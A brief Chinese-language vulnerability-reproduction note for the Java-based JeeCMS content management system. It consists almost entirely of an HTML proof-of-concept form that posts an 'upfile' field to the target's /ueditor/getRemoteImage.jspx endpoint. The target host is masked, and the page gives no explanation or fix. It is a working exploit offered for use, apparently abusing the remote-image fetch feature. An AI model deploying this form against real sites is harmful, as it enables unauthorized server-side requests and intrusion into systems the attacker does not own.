### jeecms是JAVA开发的CMS
### 漏洞复现
```Html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
	<title>Document</title>
</head>
<body>
<form action="http://xxxxxxx:8081/ueditor/getRemoteImage.jspx" method="post" enctype="multipart/form-data">
<input name="upfile" value="ue_separate_ue">
<input type="submit">
</form>
</body>
</html>
```